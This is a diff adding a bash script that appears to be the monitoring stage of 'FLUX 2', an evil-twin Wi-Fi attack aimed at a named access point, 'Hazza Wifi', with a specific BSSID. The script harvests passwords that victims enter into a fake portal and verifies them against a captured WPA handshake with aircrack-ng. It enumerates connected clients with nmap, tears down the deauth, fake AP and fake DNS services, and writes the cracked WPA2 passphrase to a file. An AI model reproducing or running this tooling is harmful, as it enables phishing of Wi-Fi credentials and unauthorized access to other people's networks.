@@ -1,0 +1,123 @@
+#!/bin/bash
+
+        echo > /tmp/TMPflux/data.txt
+        echo -n "0"> /tmp/TMPflux/hit.txt
+        echo  >/tmp/TMPflux/loggg
+
+        tput civis
+        clear
+
+        minutos=0
+        horas=0
+        i=0
+        timestamp=$(date +%s)
+
+        while true; do
+
+        segundos=$i
+        dias=`expr $segundos / 86400`
+        segundos=`expr $segundos % 86400`
+        horas=`expr $segundos / 3600`
+        segundos=`expr $segundos % 3600`
+        minutos=`expr $segundos / 60`
+        segundos=`expr $segundos % 60`
+
+        if [ "$segundos" -le 9 ]; then
+        is="0"
+        else
+        is=
+        fi
+
+        if [ "$minutos" -le 9 ]; then
+        im="0"
+        else
+        im=
+        fi
+
+        if [ "$horas" -le 9 ]; then
+        ih="0"
+        else
+        ih=
+        fi
+if [ -f /tmp/TMPflux/pwattempt.txt ]; then
+                cat /tmp/TMPflux/pwattempt.txt >> "/root/pwlog/Hazza Wifi-64:70:02:5C:FD:24.log"
+                rm -f /tmp/TMPflux/pwattempt.txt
+                fi
+
+                if [ -f /tmp/TMPflux/intento ]; then
+
+                if ! aircrack-ng -w /tmp/TMPflux/data.txt /tmp/TMPflux/64:70:02:5C:FD:24-01.cap | grep -qi "Passphrase not in"; then
+                echo "2">/tmp/TMPflux/intento
+                break
+                else
+                echo "1">/tmp/TMPflux/intento
+                fi
+
+                fi
+readarray -t CLIENTESDHCP < <(nmap -PR -sn -n -oG - 192.168.1.100-110 2>&1 | grep Host )
+
+        echo
+        echo -e "  ACCESS POINT:"
+        echo -e "    SSID............: \033[1;37mHazza Wifi\e[0m"
+        echo -e "    MAC.............: \033[1;33m64:70:02:5C:FD:24\e[0m"
+        echo -e "    Channel.........: \033[1;37m1\e[0m"
+        echo -e "    Vendor..........: \033[1;32mTP-LINK TECHNOLOGIES CO., LTD.\e[0m"
+        echo -e "    Operation time..: \033[1;34m$ih$horas:$im$minutos:$is$segundos\e[0m"
+        echo -e "    Attempts........: \033[1;31m$(cat /tmp/TMPflux/hit.txt)\e[0m"
+        echo -e "    Clients.........: \033[1;34m$(cat /tmp/TMPflux/clientes.txt | grep DHCPACK | awk '{print $5}' | sort| uniq | wc -l)\e[0m"
+        echo
+        echo -e "  CLIENTS ONLINE:"
+
+        x=0
+        for cliente in "${CLIENTESDHCP[@]}"; do
+          x=$(($x+1))
+          CLIENTE_IP=$(echo $cliente| cut -d " " -f2)
+          CLIENTE_MAC=$(nmap -PR -sn -n $CLIENTE_IP 2>&1 | grep -i mac | awk '{print $3}' | tr [:upper:] [:lower:])
+
+          if [ "$(echo $CLIENTE_MAC| wc -m)" != "18" ]; then
+                CLIENTE_MAC="xx:xx:xx:xx:xx:xx"
+          fi
+
+          CLIENTE_FABRICANTE=$(macchanger -l | grep "$(echo "$CLIENTE_MAC" | cut -d ":" -f -3)" | cut -d " " -f 5-)
+
+          if echo $CLIENTE_MAC| grep -q x; then
+                    CLIENTE_FABRICANTE="unknown"
+          fi
+
+          CLIENTE_HOSTNAME=$(grep $CLIENTE_IP /tmp/TMPflux/clientes.txt | grep DHCPACK | sort | uniq | head -1 | grep '(' | awk -F '(' '{print $2}' | awk -F ')' '{print $1}')
+
+          echo -e "    \033[1;32m $x) \033[1;31m$CLIENTE_IP \033[1;33m$CLIENTE_MAC \e[0m(\033[1;34m$CLIENTE_FABRICANTE\e[0m) \033[1;32m $CLIENTE_HOSTNAME\e[0m"
+        done
+
+        echo -ne "\033[K\033[u"
+let i=$(date +%s)-$timestamp
+                sleep 1
+done
+        clear
+        echo "1" > /tmp/TMPflux/status.txt
+
+        sleep 7
+
+        killall mdk3 &>/dev/null
+        killall aireplay-ng &>/dev/null
+        killall airbase-ng &>/dev/null
+        kill $(ps a | grep python| grep fakedns | awk '{print $1}') &>/dev/null
+        killall hostapd &>/dev/null
+        killall lighttpd &>/dev/null
+        killall dhcpd &>/dev/null
+        killall wpa_supplicant &>/dev/null
+        killall wpa_passphrase &>/dev/null
+
+        echo "
+        FLUX 2 by ghost
+
+        SSID: Hazza Wifi
+        BSSID: 64:70:02:5C:FD:24 (TP-LINK TECHNOLOGIES CO., LTD.)
+        Channel: 1
+        Security: WPA2
+        Time: $ih$horas:$im$minutos:$is$segundos
+        Password: $(cat /tmp/TMPflux/data.txt)
+        " >"/home/shun/Hazza Wifi-password.txt"
+aircrack-ng -a 2 -b 64:70:02:5C:FD:24 -0 -s /tmp/TMPflux/64:70:02:5C:FD:24-01.cap -w /tmp/TMPflux/data.txt && echo && echo -e "The password was saved in \033[1;31m/home/shun/Hazza Wifi-password.txt\e[0m"
+                
+kill -INT $(ps a | grep bash| grep flux | awk '{print $1}') &>/dev/null
